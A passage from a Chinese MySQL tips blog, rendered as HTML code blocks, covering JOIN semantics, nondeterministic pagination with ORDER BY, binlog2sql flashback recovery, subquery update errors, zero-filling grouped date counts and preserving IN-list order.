t.score,@rowNum := @rowNum +<span class="number">1</span> <span class="keyword">as</span> rank <span class="keyword">from</span> (select @rowNum :=<span class="number">0</span>) r, scores <span class="keyword">as</span> t order by t.score desc ;</span><br><span class="line"></span><br><span class="line">id	score	rank</span><br><span class="line"><span class="number">1</span>	<span class="number">99</span>	<span class="number">1</span></span><br><span class="line"><span class="number">6</span>	<span class="number">99</span>	<span class="number">1</span></span><br><span class="line"><span class="number">3</span>	<span class="number">87</span>	<span class="number">2</span></span><br><span class="line"><span class="number">2</span>	<span class="number">80</span>	<span class="number">3</span></span><br><span class="line"><span class="number">5</span>	<span class="number">80</span>	<span class="number">3</span></span><br><span class="line"><span class="number">4</span>	<span class="number">60</span>	<span class="number">4</span></span><br><span class="line"></span><br><span class="line"> INNER JOIN...ON...: 返回俩表关联的所有行，不执行上面说的第三部JOIN添加外部行。</span><br><span class="line"> LEFT JOIN...ON... : 返回左表中的所有行，若有些行在右表中没有对应的值，将会使用NULL填充。</span><br><span class="line"> RIGHT JOIN...ON...: 返回右表中的所有行，若有些行在左表中没有对应的值，将会使用NULL填充。</span><br><span class="line"> </span><br><span class="line"> SELECT * FROM user_info <span class="keyword">as</span> i LEFT JOIN user_account <span class="keyword">as</span> a ON i.userid = a.userid and i.userid = <span class="number">1003</span>;</span><br><span class="line"> </span><br><span class="line"> SELECT * FROM user_info <span class="keyword">as</span> i LEFT JOIN user_account <span class="keyword">as</span> a ON i.userid = a.userid where i.userid = <span class="number">1003</span>;</span><br><span class="line"> 第一种情况 LEFT JOIN 在执行完第二步 ON 子句后，筛选出满足 i.userid = a.userid and i.userid = <span class="number">1003</span> 的行，生成表 vt2，然后执行第三步 JOIN 子句，将外部行添加进虚拟表生成 vt3 即最终结果：</span><br><span class="line"> </span><br><span class="line"> vt2:</span><br><span class="line"> | userid | name | userid | money |</span><br><span class="line"> |  --------   |  --------  |   --------   |  --------  |</span><br><span class="line"> |   <span class="number">1003</span> | z    |   <span class="number">1003</span> |     <span class="number">8</span> |</span><br><span class="line"> </span><br><span class="line"> vt3:</span><br><span class="line"> | userid | name | userid | money |</span><br><span class="line"> |  --------   |  --------  |   --------   |  --------  |</span><br><span class="line"> |   <span class="number">1001</span> | x    |   NULL |  NULL |</span><br><span class="line"> |   <span class="number">1002</span> | y    |   NULL |  NULL |</span><br><span class="line"> |   <span class="number">1003</span> | z    |   <span class="number">1003</span> |     <span class="number">8</span> |</span><br><span class="line"> |   <span class="number">1004</span> | a    |   NULL |  NULL |</span><br><span class="line"> |   <span class="number">1005</span> | b    |   NULL |  NULL |</span><br><span class="line"> |   <span class="number">1006</span> | c    |   NULL |  NULL |</span><br><span class="line"> |   <span class="number">1007</span> | d    |   NULL |  NULL |</span><br><span class="line"> |   <span class="number">1008</span> | e    |   NULL |  NULL |</span><br><span class="line"> 而第二种情况 LEFT JOIN 在执行完第二步 ON 子句后，筛选出满足 i.userid = a.userid 的行，生成表 vt2；再执行第三步 JOIN 子句添加外部行生成表 vt3；然后执行第四步 WHERE 子句，再对 vt3 表进行过滤生成 vt4，得的最终结果：</span><br><span class="line"> </span><br><span class="line"> vt2:</span><br><span class="line"> | userid | name | userid | money |</span><br><span class="line"> |  --------   |  --------  |   --------   |  --------  |</span><br><span class="line"> |   <span class="number">1001</span> | x    |   <span class="number">1001</span> |    <span class="number">22</span> |</span><br><span class="line"> |   <span class="number">1002</span> | y    |   <span class="number">1002</span> |    <span class="number">30</span> |</span><br><span class="line"> |   <span class="number">1003</span> | z    |   <span class="number">1003</span> |     <span class="number">8</span> |</span><br><span class="line"> vt3:</span><br><span class="line"> | userid | name | userid | money |</span><br><span class="line"> |  --------   |  --------  |   --------   |  --------  |</span><br><span class="line"> |   <span class="number">1001</span> | x    |   <span class="number">1001</span> |    <span class="number">22</span> |</span><br><span class="line"> |   <span class="number">1002</span> | y    |   <span class="number">1002</span> |    <span class="number">30</span> |</span><br><span class="line"> |   <span class="number">1003</span> | z    |   <span class="number">1003</span> |     <span class="number">8</span> |</span><br><span class="line"> |   <span class="number">1004</span> | a    |   NULL |  NULL |</span><br><span class="line"> |   <span class="number">1005</span> | b    |   NULL |  NULL |</span><br><span class="line"> |   <span class="number">1006</span> | c    |   NULL |  NULL |</span><br><span class="line"> |   <span class="number">1007</span> | d    |   NULL |  NULL |</span><br><span class="line"> |   <span class="number">1008</span> | e    |   NULL |  NULL |</span><br><span class="line"> vt4:</span><br><span class="line"> | userid | name | userid | money |</span><br><span class="line"> |  --------   |  --------  |   --------   |  --------  |</span><br><span class="line"> |   <span class="number">1003</span> | z    |   <span class="number">1003</span> |     <span class="number">8</span> |</span><br><span class="line"> 如果将上例的 LEFT JOIN 替换成 INNER JOIN，不论将条件过滤放到 ON 还是 WHERE 里，结果都是一样的，因为 INNER JOIN 不会执行第三步添加外部行。</span><br><span class="line"> </span><br><span class="line"> SELECT * FROM user_info <span class="keyword">as</span> i INNER JOIN user_account <span class="keyword">as</span> a ON i.userid = a.userid and i.userid = <span class="number">1003</span>;</span><br><span class="line"> SELECT * FROM user_info <span class="keyword">as</span> i INNER JOIN user_account <span class="keyword">as</span> a ON i.userid = a.userid where i.userid = <span class="number">1003</span>;</span><br><span class="line"> 返回结果都是：</span><br><span class="line"> </span><br><span class="line"> | userid | name | userid | money |</span><br><span class="line"> |  --------   |  --------  |   --------   |  --------  |</span><br><span class="line"> |   <span class="number">1003</span> | z    |   <span class="number">1003</span> |     <span class="number">8</span> |</span><br><span class="line"> https:<span class="comment">//learnku.com/articles/27701</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-分页数据错乱重复"><a href="#MySQL-分页数据错乱重复" class="headerlink" title="MySQL 分页数据错乱重复"></a>MySQL 分页数据错乱重复</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">select xx <span class="keyword">from</span> table_name wheere xxx order by 字段A limit offset;，</span><br><span class="line">表数据总共 <span class="number">48</span> 条，分页数量正常，但出现了结果混杂的情况，第一页的数据出现在了第二页上；如果 order by 字段B 就不会出现这个现象</span><br><span class="line">mysql <span class="number">5.6</span> </span><br><span class="line">create table glon(  </span><br><span class="line">    -&gt;     id int not <span class="literal">null</span> auto_increment primary key,  </span><br><span class="line">    -&gt;     name varchar(<span class="number">20</span>) not <span class="literal">null</span>,  </span><br><span class="line">    -&gt;     create_time datetime not <span class="literal">null</span>,  </span><br><span class="line">    -&gt;     age tinyint unsigned <span class="keyword">default</span> <span class="number">18</span>  </span><br><span class="line">    -&gt; );</span><br><span class="line">INSERT INTO <span class="string">`glon`</span> VALUES (<span class="number">1</span>, <span class="string">'Eason Chan'</span>, <span class="string">'2017-05-02 08:10:10'</span>, <span class="number">19</span>),(<span class="number">2</span>, <span class="string">'Glon Ho'</span>, <span class="string">'2017-05-03 12:10:10'</span>, <span class="number">18</span>),(<span class="number">3</span>, <span class="string">'赵敏'</span>, <span class="string">'2017-05-03 14:10:10'</span>, <span class="number">17</span>),(<span class="number">4</span>, <span class="string">'Jacky Cheung'</span>, <span class="string">'2017-05-02 14:00:00'</span>, <span class="number">22</span>),(<span class="number">5</span>, <span class="string">'周芷若'</span>, <span class="string">'2017-05-02 14:00:00'</span>, <span class="number">16</span>),(<span class="number">6</span>, <span class="string">'Andy Lau'</span>, <span class="string">'2017-05-02 14:00:00'</span>, <span class="number">50</span>),(<span class="number">7</span>, <span class="string">'至尊宝'</span>, <span class="string">'2017-05-02 14:00:00'</span>, <span class="number">20</span>),(<span class="number">8</span>, <span class="string">'刘三姐'</span>, <span class="string">'2017-05-02 14:00:00'</span>, <span class="number">19</span>);</span><br><span class="line"></span><br><span class="line">root@localhost [glon_ho]&gt;select * <span class="keyword">from</span> glon;</span><br><span class="line">+----+--------------+---------------------+------+</span><br><span class="line">| id | name         | create_time         | age  |</span><br><span class="line">+----+--------------+---------------------+------+</span><br><span class="line">|  <span class="number">1</span> | Eason Chan   | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">08</span>:<span class="number">10</span>:<span class="number">10</span> |   <span class="number">19</span> |</span><br><span class="line">|  <span class="number">2</span> | Glon Ho      | <span class="number">2017</span><span class="number">-05</span><span class="number">-03</span> <span class="number">12</span>:<span class="number">10</span>:<span class="number">10</span> |   <span class="number">18</span> |</span><br><span class="line">|  <span class="number">3</span> | 赵敏         | <span class="number">2017</span><span class="number">-05</span><span class="number">-03</span> <span class="number">14</span>:<span class="number">10</span>:<span class="number">10</span> |   <span class="number">17</span> |</span><br><span class="line">|  <span class="number">4</span> | Jacky Cheung | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">22</span> |</span><br><span class="line">|  <span class="number">5</span> | 周芷若       | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">16</span> |</span><br><span class="line">|  <span class="number">6</span> | Andy Lau     | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">50</span> |</span><br><span class="line">|  <span class="number">7</span> | 至尊宝       | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">20</span> |</span><br><span class="line">|  <span class="number">8</span> | 刘三姐       | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">19</span> |</span><br><span class="line">+----+--------------+---------------------+------+</span><br><span class="line"></span><br><span class="line">root@localhost [glon_ho]&gt;select * <span class="keyword">from</span> glon ORDER BY create_time limit <span class="number">0</span>, <span class="number">4</span>;</span><br><span class="line">+----+--------------+---------------------+------+</span><br><span class="line">| id | name         | create_time         | age  |</span><br><span class="line">+----+--------------+---------------------+------+</span><br><span class="line">|  <span class="number">1</span> | Eason Chan   | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">08</span>:<span class="number">10</span>:<span class="number">10</span> |   <span class="number">19</span> |</span><br><span class="line">|  <span class="number">8</span> | 刘三姐       | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">19</span> |</span><br><span class="line">|  <span class="number">6</span> | Andy Lau     | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">50</span> |</span><br><span class="line">|  <span class="number">4</span> | Jacky Cheung | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">22</span> |</span><br><span class="line">+----+--------------+---------------------+------+</span><br><span class="line"><span class="number">4</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">root@localhost [glon_ho]&gt;select * <span class="keyword">from</span> glon ORDER BY create_time limit <span class="number">4</span>, <span class="number">4</span>;</span><br><span class="line">+----+-----------+---------------------+------+</span><br><span class="line">| id | name      | create_time         | age  |</span><br><span class="line">+----+-----------+---------------------+------+</span><br><span class="line">|  <span class="number">7</span> | 至尊宝    | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">20</span> |</span><br><span class="line">|  <span class="number">8</span> | 刘三姐    | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">19</span> |</span><br><span class="line">|  <span class="number">2</span> | Glon Ho   | <span class="number">2017</span><span class="number">-05</span><span class="number">-03</span> <span class="number">12</span>:<span class="number">10</span>:<span class="number">10</span> |   <span class="number">18</span> |</span><br><span class="line">|  <span class="number">3</span> | 赵敏      | <span class="number">2017</span><span class="number">-05</span><span class="number">-03</span> <span class="number">14</span>:<span class="number">10</span>:<span class="number">10</span> |   <span class="number">17</span> |</span><br><span class="line">+----+-----------+---------------------+------+</span><br><span class="line"><span class="number">4</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">两次查询结果中都出现了 id 为 <span class="number">8</span> 的刘三姐，从上面初始化数据来看，总共有 <span class="number">8</span> 条数据，现在不但分页出现重复数据，还丢了一条！</span><br><span class="line">select * <span class="keyword">from</span> glon ORDER BY create_time,id limit <span class="number">0</span>, <span class="number">4</span>;</span><br><span class="line">+----+--------------+---------------------+------+</span><br><span class="line">| id | name         | create_time         | age  |</span><br><span class="line">+----+--------------+---------------------+------+</span><br><span class="line">|  <span class="number">1</span> | Eason Chan   | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">08</span>:<span class="number">10</span>:<span class="number">10</span> |   <span class="number">19</span> |</span><br><span class="line">|  <span class="number">4</span> | Jacky Cheung | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">22</span> |</span><br><span class="line">|  <span class="number">5</span> | 周芷若       | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">16</span> |</span><br><span class="line">|  <span class="number">6</span> | Andy Lau     | <span class="number">2017</span><span class="number">-05</span><span class="number">-02</span> <span class="number">14</span>:<span class="number">00</span>:<span class="number">00</span> |   <span class="number">50</span> |</span><br><span class="line">order by 排序的时候，如果排序字段中有多行相同的列值，则排序结果是不确定的。所以后面的几组组合形式的排序或者是主键 id 的排序，因为唯一性高，所以排序是确定的，不会出现结果混乱的问题。</span><br><span class="line">最简单的方法就是在排序列（如 create time）上加索引，然后在 order by 上明示 primary key，这个问题就非常圆满的解决了。</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/glon/p/6806064.html</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-闪回工具之-binlog2sql"><a href="#MySQL-闪回工具之-binlog2sql" class="headerlink" title="MySQL 闪回工具之 binlog2sql"></a>MySQL 闪回工具之 binlog2sql</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">直接整个解析 mysql-bin<span class="number">.000001</span> 日志</span><br><span class="line"></span><br><span class="line">[root@node1 binlog2sql]# python binlog2sql.py -h127.0.0.1 -P3306 -uglon -p'123456' -dglonho -ttest --start-file='mysql-bin.000001'</span><br><span class="line">USE glonho;</span><br><span class="line">CREATE TABLE <span class="string">`test`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">11</span>) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> varchar(<span class="number">20</span>) NOT NULL,</span><br><span class="line">  <span class="string">`create_time`</span> datetime NOT NULL,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">INSERT INTO `glonho`.`test`(`create_time`, `id`, `name`) VALUES ('2012-10-01 00:00:00', 1, 'Glon Ho'); #start 547 end 772 time 2017-05-12 15:02:23</span><br><span class="line">INSERT INTO `glonho`.`test`(`create_time`, `id`, `name`) VALUES ('2016-05-02 00:00:00', 2, 'Eason Chan'); #start 547 end 772 time 2017-05-12 15:02:23</span><br><span class="line"></span><br><span class="line">[root@node1 binlog2sql]# python binlog2sql.py --flashback -h127.0.0.1 -P3306 -uglon -p'123456' -dglonho -ttest --start-file='mysql-bin.000001' --start-datetime="2017-05-12 14:57:00" --stop-datetime="2017-05-12 15:04:22"</span><br><span class="line">INSERT INTO `glonho`.`test`(`create_time`, `id`, `name`) VALUES ('2015-05-02 00:00:00', 3, 'Jacky Cheung'); #start 1164 end 1350 time 2017-05-12 15:04:03</span><br><span class="line">UPDATE `glonho`.`test` SET `create_time`='2012-10-01 00:00:00', `id`=1, `name`='Glon Ho' WHERE `create_time`='2017-05-12 00:00:00' AND `id`=1 AND `name`='Glon Ho' LIMIT 1; #start 868 end 1068 time 2017-05-12 15:03:34</span><br><span class="line"><span class="number">1</span>、在配置文件中设置了以下参数：</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">server_id = <span class="number">1</span></span><br><span class="line">log_bin = <span class="regexp">/var/</span>log/mysql/mysql-bin.log</span><br><span class="line">max_binlog_size = <span class="number">1</span>G</span><br><span class="line">binlog_format = row</span><br><span class="line">binlog_row_image = full # 默认</span><br><span class="line"><span class="number">2</span>、在闪回的时候必须启动 MySQL 服务，因为它是通过 BINLOG_DUMP 协议来获取 binlog 内容，需要读取server端 information_schema.COLUMNS 表，来获取表结构的元信息，才能拼接成 SQL 语句。因此需要给用户提供的最小权限如下：</span><br><span class="line"></span><br><span class="line">GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO <span class="string">'user'</span>@<span class="string">'%'</span>;</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/glon/p/6856192.html</span></span><br></pre></td></tr></table></figure>
<h3 id="You-can’t-specify-target-table-for-update"><a href="#You-can’t-specify-target-table-for-update" class="headerlink" title="You can’t specify target table for update"></a>You can’t specify target table for update</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql不允许update目标表和子查询里面的表为同一张表</span><br><span class="line"></span><br><span class="line">错误sql：</span><br><span class="line"></span><br><span class="line">UPDATE mg_brand set <span class="string">`status`</span>=<span class="string">'0'</span> where iID=(SELECT id <span class="keyword">from</span> mg_industry where <span class="string">`name`</span>=<span class="string">'汽车'</span>) and id <span class="keyword">in</span> (SELECT id <span class="keyword">from</span> mg_brand WHERE nameC = <span class="string">'欧宝'</span> or pID = (SELECT id <span class="keyword">from</span> mg_brand WHERE nameC = <span class="string">'欧宝'</span>));</span><br><span class="line"></span><br><span class="line">解决办法：子查询sql可以改变双层的子查询，即可执行成功</span><br><span class="line"></span><br><span class="line">示例sql:</span><br><span class="line"></span><br><span class="line">UPDATE mg_brand SET <span class="string">`status`</span> = <span class="string">'0'</span> WHERE iID = ( SELECT id FROM mg_industry WHERE <span class="string">`name`</span> = <span class="string">'汽车'</span> ) AND id IN ( SELECT id FROM (SELECT id FROM mg_brand) AS temp WHERE nameC = <span class="string">'欧宝'</span> OR pID = ( SELECT id FROM ( SELECT id FROM mg_brand WHERE nameC = <span class="string">'欧宝'</span> ) AS te WHERE <span class="number">1</span> ));</span><br></pre></td></tr></table></figure>
<h3 id="分组无数据查询填充0"><a href="#分组无数据查询填充0" class="headerlink" title="分组无数据查询填充0"></a>分组无数据查询填充0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">select date(t.create_time) <span class="keyword">as</span> <span class="string">`date`</span>,</span><br><span class="line">       count(t.id)  <span class="keyword">as</span> num</span><br><span class="line"><span class="keyword">from</span> t_user t</span><br><span class="line">group by <span class="string">`date`</span>;</span><br><span class="line">select * <span class="keyword">from</span> (SELECT DATE_FORMAT(DATE_SUB(<span class="string">'2019-05-09'</span>, INTERVAL xc day), <span class="string">'%Y-%m-%d'</span>) <span class="keyword">as</span> day</span><br><span class="line">      FROM (SELECT @xi := @xi + <span class="number">1</span> <span class="keyword">as</span> xc</span><br><span class="line">             <span class="keyword">from</span> (SELECT <span class="number">1</span> UNION SELECT <span class="number">2</span> UNION SELECT <span class="number">3</span> UNION SELECT <span class="number">4</span> UNION SELECT <span class="number">5</span>) xc1,</span><br><span class="line">                  (SELECT <span class="number">1</span> UNION SELECT <span class="number">2</span> UNION SELECT <span class="number">3</span> UNION SELECT <span class="number">4</span> UNION SELECT <span class="number">5</span>) xc2,</span><br><span class="line">                  (SELECT <span class="number">1</span> UNION SELECT <span class="number">2</span> UNION SELECT <span class="number">3</span> UNION SELECT <span class="number">4</span> UNION SELECT <span class="number">5</span>) xc3,</span><br><span class="line">                  (SELECT @xi := <span class="number">-1</span>) xc0</span><br><span class="line">           ) <span class="keyword">as</span> t) <span class="keyword">as</span> t2</span><br><span class="line">					 where t2.<span class="string">`day`</span> &gt; <span class="string">'2019-05-02'</span> and t2.<span class="string">`day`</span> &lt;= <span class="string">'2019-05-09'</span></span><br><span class="line">select t2.<span class="string">`day`</span> <span class="keyword">as</span> <span class="string">`date`</span>, count(t.id) <span class="keyword">as</span> num</span><br><span class="line"><span class="keyword">from</span> (SELECT DATE_FORMAT(DATE_SUB(<span class="string">'2019-05-09'</span>, INTERVAL xc day), <span class="string">'%Y-%m-%d'</span>) <span class="keyword">as</span> day</span><br><span class="line">      FROM (</span><br><span class="line">             SELECT @xi := @xi + <span class="number">1</span> <span class="keyword">as</span> xc</span><br><span class="line">             <span class="keyword">from</span> (SELECT <span class="number">1</span> UNION SELECT <span class="number">2</span> UNION SELECT <span class="number">3</span> UNION SELECT <span class="number">4</span> UNION SELECT <span class="number">5</span>) xc1,</span><br><span class="line">                  (SELECT <span class="number">1</span> UNION SELECT <span class="number">2</span> UNION SELECT <span class="number">3</span> UNION SELECT <span class="number">4</span> UNION SELECT <span class="number">5</span>) xc2,</span><br><span class="line">                  (SELECT <span class="number">1</span> UNION SELECT <span class="number">2</span> UNION SELECT <span class="number">3</span> UNION SELECT <span class="number">4</span> UNION SELECT <span class="number">5</span>) xc3,</span><br><span class="line">                  (SELECT @xi := <span class="number">-1</span>) xc0</span><br><span class="line">           ) <span class="keyword">as</span> x1x2x) t2</span><br><span class="line">       left join t_user t on date(t.create_time) = t2.day</span><br><span class="line">where t2.<span class="string">`day`</span> &gt; <span class="string">'2019-05-02'</span> and t2.<span class="string">`day`</span> &lt;= <span class="string">'2019-05-09'</span></span><br><span class="line">group by date ORDER BY date asc;</span><br><span class="line"></span><br><span class="line">+------------+-----+</span><br><span class="line">|    date    | num |</span><br><span class="line">+------------+-----+</span><br><span class="line">| <span class="number">2019</span><span class="number">-05</span><span class="number">-03</span> |  <span class="number">0</span>  |</span><br><span class="line">+------------+-----+</span><br><span class="line">| <span class="number">2019</span><span class="number">-05</span><span class="number">-04</span> |  <span class="number">0</span>  |</span><br><span class="line">+------------+-----+</span><br><span class="line">| <span class="number">2019</span><span class="number">-05</span><span class="number">-05</span> |  <span class="number">0</span>  |</span><br><span class="line">+------------+-----+</span><br><span class="line">| <span class="number">2019</span><span class="number">-05</span><span class="number">-06</span> |  <span class="number">2</span>  |</span><br><span class="line">+------------+-----+</span><br><span class="line">| <span class="number">2019</span><span class="number">-05</span><span class="number">-07</span> |  <span class="number">0</span>  |</span><br><span class="line">+------------+-----+</span><br><span class="line">| <span class="number">2019</span><span class="number">-05</span><span class="number">-08</span> |  <span class="number">2</span>  |</span><br><span class="line">+------------+-----+</span><br><span class="line">| <span class="number">2019</span><span class="number">-05</span><span class="number">-09</span> |  <span class="number">9</span>  |</span><br><span class="line">+------------+-----+</span><br><span class="line">http:<span class="comment">//nullpointer.pw/Mysql%E6%97%A5%E6%9C%9F%E5%88%86%E7%BB%84%E6%97%A0%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%E5%A1%AB%E5%85%850.html</span></span><br></pre></td></tr></table></figure>
<h3 id="保留-IN-中的顺序"><a href="#保留-IN-中的顺序" class="headerlink" title="保留 IN 中的顺序"></a>保留 IN 中的顺序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="string">`user_temporary`</span> WHERE ( <span class="string">`id`</span> IN (<span class="string">'29500'</span>,<span class="string">'29582'</span>,<span class="string">'29583'</span>,<span class="string">'28299'</span>) ) LIMIT <span class="number">0</span>, <span class="number">20</span>;</span><br><span class="line">SELECT * FROM <span class="string">`user_temporary`</span> WHERE ( <span class="string">`id`</span> IN (<span class="string">'29500'</span>,<span class="string">'29582'</span>,<span class="string">'29583'</span>,<span class="string">'28299'</span><span class="string">') ) ORDER BY field(id,29500,29582,29583,28299) LIMIT 0, 20;</span></span><br></pre></td></tr></table></figure>
<h3 id="分组取前3"><a href="#分组取前3" class="headerlink" title="分组取前3"></a>分组取前3</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">cs_goods 表结构</span><br><span class="line"></span><br><span class="line">id	goods_id	cs_merchant_id	created_at</span><br><span class="line"><span class="number">1</span>	<span class="number">234</span>	<span class="number">3</span>	<span class="number">2019</span><span class="number">-07</span><span class="number">-09</span> <span class="number">19</span>:<span class="number">45</span>:<span class="number">33</span></span><br><span class="line"><span class="number">2</span>	<span class="number">33</span>	<span class="number">3</span>	<span class="number">2019</span><span class="number">-07</span><span class="number">-10</span> <span class="number">19</span>:<span class="number">45</span>:<span class="number">33</span></span><br><span class="line"><span class="number">3</span>	<span class="number">44</span>	<span class="number">3</span>	<span class="number">2019</span><span class="number">-07</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">45</span>:<span class="number">33</span></span><br><span class="line"><span class="number">4</span>	<span class="number">55</span>	<span class="number">3</span>	<span class="number">2019</span><span class="number">-07</span><span class="number">-01</span> <span class="number">19</span>:<span class="number">45</span>:<span class="number">33</span></span><br><span class="line"><span class="number">5</span>	<span class="number">33</span>	<span class="number">5</span>	<span class="number">2019</span><span class="number">-07</span><span class="number">-02</span> <span class="number">19</span>:<span class="number">45</span>:<span class="number">33</span></span><br><span class="line"><span class="number">6</span>	<span class="number">44</span>	<span class="number">5</span>	<span class="number">2019</span><span class="number">-07</span><span class="number">-08</span> <span class="number">19</span>:<span class="number">45</span>:<span class="number">33</span></span><br><span class="line"><span 